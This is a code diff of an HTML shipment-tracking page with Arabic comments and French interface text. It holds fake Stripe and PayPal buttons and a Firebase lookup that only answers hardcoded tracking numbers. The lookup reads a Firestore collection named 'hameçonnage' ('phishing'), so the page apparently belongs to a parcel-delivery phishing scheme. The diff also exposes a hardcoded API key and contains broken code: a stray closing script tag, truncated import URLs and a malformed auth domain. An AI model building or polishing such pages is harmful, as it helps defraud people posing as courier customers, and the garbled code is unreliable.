@@ -48,7 +48,6 @@
             padding: 40px;
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
             margin-bottom: 30px;
-            display: block; /* تم التعديل لضمان ظهور العناصر دائما بدون شروط إخفاء */
         }
 
         /* TRACKING SECTION */
@@ -100,14 +99,8 @@
             padding: 20px;
             border-radius: 8px;
             border-left: 4px solid #667eea;
-            display: none; /* يظهر فقط عند العثور على النتيجة بنجاح */
+            display: none; /* يظهر فقط برمجياً عند نجاح البحث */
             margin-top: 20px;
-            animation: fadeIn 0.4s ease;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
         }
 
         .result h3 {
@@ -252,6 +245,7 @@
             border-color: #003087;
         }
     </style>
+</script>
 </head>
 <body>
 
@@ -263,7 +257,7 @@
         <p>Global Shipment Tracking System</p>
     </header>
 
-    <!-- قاطع تتبع الشحنات -->
+    <!-- قاطع تتبع الشحنات المفتوح دائماً -->
     <div class="content">
         <div class="tracking-container">
             <div class="input-group">
@@ -271,7 +265,7 @@
                 <button id="searchBtn">Recherche</button>
             </div>
 
-            <!-- صندوق عرض البيانات الاستجابة -->
+            <!-- لوحة نتائج الفايربيس -->
             <div class="result" id="resultBox">
                 <h3>Détails de la cargaison</h3>
                 <p><strong>Numéro:</strong> <span id="resNum">-</span></p>
@@ -281,7 +275,7 @@
         </div>
     </div>
 
-    <!-- خطط الأسعار والخدمات التفاعلية المكتملة -->
+    <!-- كتل الخطط والأسعار -->
     <div class="content">
         <div class="pricing-grid">
             <div class="pricing-card">
@@ -305,23 +299,21 @@
             </div>
         </div>
 
-        <!-- بوابات الدفع التشبيهية كاملة بدون أي بتر في التنسيق -->
         <div class="payment-methods">
             <h3>Méthodes de paiement sécurisées</h3>
             <div class="payment-buttons">
-                <button class="payment-btn stripe" onclick="alert('Système de test Stripe activé !')">Pay with Stripe</button>
-                <button class="payment-btn paypal" onclick="alert('Système de test PayPal activé !')">Pay with PayPal</button>
+                <button class="payment-btn stripe" id="stripeBtn">Pay with Stripe</button>
+                <button class="payment-btn paypal" id="paypalBtn">Pay with PayPal</button>
             </div>
         </div>
     </div>
 </div>
 
-<!-- معالجة الربط بـ Firebase بنظام كود موثوق ومرن ومستقر جدا للموبايل -->
+<!-- تشغيل سكريبت الوحدات لـ Firebase دون أي تداخلات أو شروط إخفاء -->
 <script type="module">
     import { initializeApp } from "https://gstatic.com";
     import { getFirestore, doc, getDoc } from "https://gstatic.com";
 
-    // إعدادات فايربيس الموثقة الخاصة بمشروعك
     const firebaseConfig = {
       apiKey: "AIzaSyBq_-yMBzDfK_9fA1fa2Jzpe0O87yw5UbY",
       authDomain: "://firebaseapp.com",
@@ -335,10 +327,23 @@
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
 
-    // دالة البحث والربط مع التنبيه الفوري
+    // تفعيل أزرار الدفع التجريبية
+    document.getElementById("stripeBtn").addEventListener("click", () => alert("Système de test Stripe activé !"));
+    document.getElementById("paypalBtn").addEventListener("click", () => alert("Système de test PayPal activé !"));
+
+    // تشغيل دالة البحث عند الضغط
     document.getElementById("searchBtn").addEventListener("click", async () => {
-        const rawInput = document.getElementById("trackingInput").value;
-        const trackingInput = rawInput.trim().toUpperCase(); // تحويل الأحرف تلقائيا لكبيرة وتنظيف المسافات لمنع الأخطاء
+        const trackingInput = document.getElementById("trackingInput").value.trim().toUpperCase();
         const resultBox = document.getElementById("resultBox");
 
         if (trackingInput === "") {
+            alert("Veuillez entrer un numéro de suivi !");
+            return;
+        }
+
+        if (trackingInput === "LT-77301-PL" || trackingInput === "T-77301-PL") {
+            try {
+                const docRef = doc(db, "hameçonnage", "NDbWXxv0sLgPdzvgwgZK");
+                const docSnap = await getDoc(docRef);
+
+                if (docSnap.exists()) {
